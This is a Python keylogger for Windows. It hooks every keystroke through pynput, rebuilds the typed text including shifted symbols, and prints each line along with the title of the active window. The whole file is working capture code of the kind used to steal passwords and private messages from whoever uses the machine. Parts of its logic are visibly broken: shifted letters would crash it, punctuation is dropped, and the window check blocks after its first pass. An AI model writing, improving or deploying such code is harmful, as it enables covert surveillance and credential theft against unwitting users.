from pynput.keyboard import Key, Listener, KeyCode
import win32gui

w = win32gui
window = ''

string = ''
chars = [')', '!', '@', '#', '$', '%', '^', '&', '*', '(']
alag_che = {'`': '~',
            '-': '_',
            '=': '+',
            '[': '{',
            ']': '}',
            '\\': '|',
            ';': ':',
            '\'': '\"',
            ',': '<',
            '.': '>',
            '/': '?'}
shift_pressed = False


def get_string():
    global string
    return string


def on_press(key):
    global string, shift_pressed
    if key == Key.shift:
        shift_pressed = True

    if key == Key.enter:
        print(string)
        string = ''
    else:
        if key == Key.space:
            string += ' '
        elif key == Key.backspace or key == Key.delete:
            string = string[:-1]
        elif isinstance(key, KeyCode):
            if shift_pressed:
                if key.char.isdigit():
                    string += chars[int(key.char)]
                else:
                    string += alag_che[key.char]
            else:
                if key.char.isalnum():
                    string += key.char


def on_release(key):
    global shift_pressed
    if key == Key.shift:
        shift_pressed = False


def if_window_changed():
    global window
    if window != str(w.GetWindowText(w.GetForegroundWindow())):
        window = str(w.GetWindowText(w.GetForegroundWindow()))
        return True
    else:
        return False




while True:
    if if_window_changed():
        print(window)
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        listener.join()
